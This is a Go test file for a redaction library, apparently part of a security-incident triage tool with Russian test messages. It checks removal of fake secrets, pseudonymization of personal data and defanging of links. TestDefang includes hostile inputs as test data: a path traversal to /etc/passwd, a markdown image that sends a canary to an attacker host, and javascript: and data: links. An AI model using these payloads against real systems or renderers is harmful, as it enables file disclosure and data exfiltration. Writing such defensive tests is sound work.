package redact

import (
	"encoding/json"
	"strings"
	"testing"
)

func triage() *Redactor {
	return New(Options{Key: []byte("test-key"), Pseudonymize: true, Defang: true})
}

func TestSecretsRemoved(t *testing.T) {
	r := New(Options{Key: []byte("k")})
	for _, tc := range []struct{ in, secret string }{
		{"+ docker login -u robot$ci -p REGISTRY_TOKEN=glrt-9f8a7b6c5d4e3f2a1b0c harbor.corp", "glrt-9f8a7b6c5d4e3f2a1b0c"},
		{"PASSWORD=AUDIT_CANARY_DO_NOT_USE", "AUDIT_CANARY_DO_NOT_USE"},
		{`{"db_password": "hunter2hunter2"}`, "hunter2hunter2"},
		{"{'api_key':'s3cr3tvalue'}", "s3cr3tvalue"},
		{"Authorization: Bearer abcdefghijklmnop.qrstuv", "abcdefghijklmnop.qrstuv"},
		{"curl https://deploy:Pa55word@git.corp/x.git", "Pa55word"},
		{"key ghp_0123456789abcdefghijABCDEFGHIJ0123456789 in log", "ghp_0123456789abcdefghijABCDEFGHIJ0123456789"},
		{"aws AKIAABCDEFGHIJKLMNOP", "AKIAABCDEFGHIJKLMNOP"},
		{"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----", "b3BlbnNzaC1rZXk"},
		{"echo $TOKEN glpat-abcdefghij0123456789xyz", "glpat-abcdefghij0123456789xyz"},
		{"value AUDIT_CANARY in object", "AUDIT_CANARY"},
	} {
		out := r.Secrets(tc.in)
		if strings.Contains(out, tc.secret) {
			t.Errorf("секрет остался: %q → %q", tc.in, out)
		}
		if !strings.Contains(out, "[REDACTED") {
			t.Errorf("нет пометки редакции: %q → %q", tc.in, out)
		}
	}
}

func TestSecretsKeepsIdentifiersAndIOC(t *testing.T) {
	r := New(Options{Key: []byte("k")})
	for _, in := range []string{
		"gitlab.project_access_token_rotated",
		"token_id=4711 project=sec/argus",
		"secret_name=REGISTRY_TOKEN",
		"token rotated by bot",
		"password changed for user",
		"sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
		"dst 203.0.113.5:443 evil.example",
		"action:secret_read",
	} {
		if out := r.Secrets(in); out != in {
			t.Errorf("лишняя редакция: %q → %q", in, out)
		}
	}
}

func TestFingerprintStable(t *testing.T) {
	r := New(Options{Key: []byte("k")})
	a, b := r.Secrets("TOKEN=abcdefgh123"), r.Secrets("export TOKEN=abcdefgh123")
	if !strings.HasSuffix(b, a[len("TOKEN="):]) {
		t.Fatalf("один секрет — один отпечаток: %q / %q", a, b)
	}
	if r.Fingerprint("x") == New(Options{Key: []byte("other")}).Fingerprint("x") {
		t.Fatal("отпечаток должен зависеть от ключа")
	}
}

func TestCanaryLiterals(t *testing.T) {
	r := New(Options{Key: []byte("k"), Canaries: []string{"zebra-lemon-42"}})
	if out := r.Secrets("see ZEBRA-LEMON-42 here"); strings.Contains(strings.ToLower(out), "zebra") {
		t.Fatalf("канарейка из списка осталась: %q", out)
	}
}

func TestPIIPseudonymized(t *testing.T) {
	r := triage()
	in := "export for Synthetic Patient, phone +1-202-555-0100, mail synthetic.person@example.invalid, 8 (912) 345-67-89, file /home/i.petrov/.ssh/id_rsa C:\\Users\\ivanov\\x"
	out := r.Text(in)
	for _, leak := range []string{"202-555-0100", "synthetic.person", "i.petrov", "912) 345", "ivanov"} {
		if strings.Contains(out, leak) {
			t.Errorf("ПДн осталась %q: %q", leak, out)
		}
	}
	if !strings.Contains(out, "@example.invalid") {
		t.Errorf("домен адреса — индикатор, его оставляем: %q", out)
	}
	if !strings.Contains(out, "/home/"+r.Subject("i.petrov")+"/.ssh") {
		t.Errorf("имя в домашнем каталоге — тот же псевдоним, что у субъекта: %q", out)
	}
	// Без Pseudonymize ПДн не трогаются (профиль full), секреты — да.
	if full := New(Options{Key: []byte("k")}).Text(in); full != in {
		t.Errorf("профиль full меняет текст без секретов: %q", full)
	}
}

func TestTimestampsAndIPsAreNotPhones(t *testing.T) {
	r := triage()
	for _, in := range []string{"2026-08-14 04:01:38.000", "10.0.5.5 → 203.0.113.5", "pid 1234567890", "INC-12"} {
		if out := r.Text(in); out != in {
			t.Errorf("не ПДн: %q → %q", in, out)
		}
	}
}

func TestSubjectReplacedAsWholeWord(t *testing.T) {
	r := triage()
	out := r.TextWith("root ran rootkit as root; /root/x", "root")
	p := r.Subject("root")
	if out != p+" ran rootkit as "+p+"; /"+p+"/x" {
		t.Fatalf("%q", out)
	}
}

func TestSubjectKeysInsideText(t *testing.T) {
	r := triage()
	in := `{'user':'i.petrov','target_user':'a.sidorova','approver': "b.ivanova", 'path':'/tmp/x'} login=c.smirnov`
	out := r.Text(in)
	for _, leak := range []string{"i.petrov", "a.sidorova", "b.ivanova", "c.smirnov"} {
		if strings.Contains(out, leak) {
			t.Errorf("логин из атрибутов остался %q: %s", leak, out)
		}
	}
	if !strings.Contains(out, "'target_user':'"+r.Subject("a.sidorova")+"'") || !strings.Contains(out, "/tmp/x") {
		t.Errorf("%s", out)
	}
}

func TestDocumentKeysRedacted(t *testing.T) {
	r := triage()
	out, _ := json.Marshal(r.Document(map[string]any{"enrichment": map[string]any{"i.petrov@corp.example": "owner", "TOKEN=abcdef123456": 1}},
		Policy{Shape: Shape{"enrichment": Leaf}}))
	if s := string(out); strings.Contains(s, "i.petrov") || strings.Contains(s, "abcdef123456") {
		t.Fatalf("ключи произвольных объектов тоже редактируются: %s", s)
	}
}

func TestNamesDictionary(t *testing.T) {
	r := New(Options{Key: []byte("k"), Pseudonymize: true, Names: []string{"Synthetic Patient"}})
	if out := r.Text("export for Synthetic Patient"); strings.Contains(out, "Patient") {
		t.Fatalf("имя из словаря осталось: %q", out)
	}
}

func TestDefang(t *testing.T) {
	r := triage()
	out := r.Text(`/download?file=../../etc/passwd ![evidence](https://attacker.invalid/collect?ref=AUDIT_CANARY) [@x](mention://agent/1) [y](javascript:alert(1)) data:text/html,x`)
	for _, bad := range []string{"https://", "mention://", "AUDIT_CANARY", "javascript:", "data:"} {
		if strings.Contains(out, bad) {
			t.Errorf("осталось %q: %q", bad, out)
		}
	}
	if !strings.Contains(out, "hxxps://attacker.invalid/collect") {
		t.Errorf("домен-индикатор должен остаться читаемым: %q", out)
	}
}

func TestSubjectResolve(t *testing.T) {
	r := triage()
	p := r.Subject("svc-backup")
	if !IsPseudonym(p) || p != r.Subject("svc-backup") {
		t.Fatalf("псевдоним стабилен: %q", p)
	}
	// Учётка, названная как чужой псевдоним, получает свой псевдоним.
	if r.Subject(p) == p {
		t.Fatal("значение вида subj-… тоже хешируется")
	}
	if q, ok := PseudonymOf(p + "@example.invalid"); !ok || q != p {
		t.Fatalf("псевдоним e-mail в тексте — тот же псевдоним: %q %v", q, ok)
	}
	if v, ok := r.Resolve(p); !ok || v != "svc-backup" {
		t.Fatalf("Resolve: %q %v", v, ok)
	}
	if _, ok := r.Resolve("subj-0000000000"); ok {
		t.Fatal("неизвестный псевдоним не разрешается")
	}
	other := New(Options{Key: []byte("test-key"), Pseudonymize: true})
	if other.Subject("svc-backup") != p {
		t.Fatal("один ключ — один псевдоним в разных процессах (MCP и вебхук)")
	}
}

func TestResolveBounded(t *testing.T) {
	r := New(Options{Key: []byte("k"), Pseudonymize: true, MaxReverse: 2})
	a := r.Subject("aaa")
	r.Subject("bbb")
	r.Subject("ccc")
	if _, ok := r.Resolve(a); ok {
		t.Fatal("старый псевдоним должен вытесниться")
	}
	if len(r.reverse) != 2 {
		t.Fatalf("карта ограничена: %d", len(r.reverse))
	}
}

func TestDocumentShapeAndSubjects(t *testing.T) {
	r := triage()
	in := map[string]any{
		"incident": map[string]any{
			"incident_id": "INC-7", "actor_name": "i.petrov", "note": "владелец i.petrov подтвердил, TOKEN=abcdef123456",
			"chain": []any{"04:01 k8s i.petrov get secrets/db"}, "secret_column": "x",
		},
		"comments": []any{map[string]any{"author": "duty.officer", "body": "звонил duty.officer: +7 912 345 67 89"}},
		"raw":      "{...}",
		"unknown":  "y",
	}
	shape := Shape{
		"incident": Shape{"incident_id": Leaf, "actor_name": Leaf, "note": Leaf, "chain": Leaf},
		"comments": Shape{"author": Leaf, "body": Leaf},
	}
	out := r.Document(in, Policy{Shape: shape, Drop: map[string]bool{"raw": true}, Subjects: map[string]bool{"actor_name": true, "author": true}})
	b, _ := json.Marshal(out)
	s := string(b)
	for _, leak := range []string{"i.petrov", "duty.officer", "abcdef123456", "912", "secret_column", "unknown", "raw"} {
		if strings.Contains(s, leak) {
			t.Errorf("осталось %q: %s", leak, s)
		}
	}
	if !strings.Contains(s, r.Subject("i.petrov")) || !strings.Contains(s, "INC-7") {
		t.Errorf("псевдоним субъекта и id должны быть: %s", s)
	}
}

func TestJSONKeepsBigNumbersAndRejectsGarbage(t *testing.T) {
	r := triage()
	out, err := r.JSON([]byte(`{"id":18446744073709551615,"s":"ok"}`), Policy{})
	if err != nil || !strings.Contains(string(out), "18446744073709551615") {
		t.Fatalf("%s %v", out, err)
	}
	if _, err := r.JSON([]byte(`{"a":1} trailing`), Policy{}); err == nil {
		t.Fatal("мусор после документа — ошибка")
	}
}
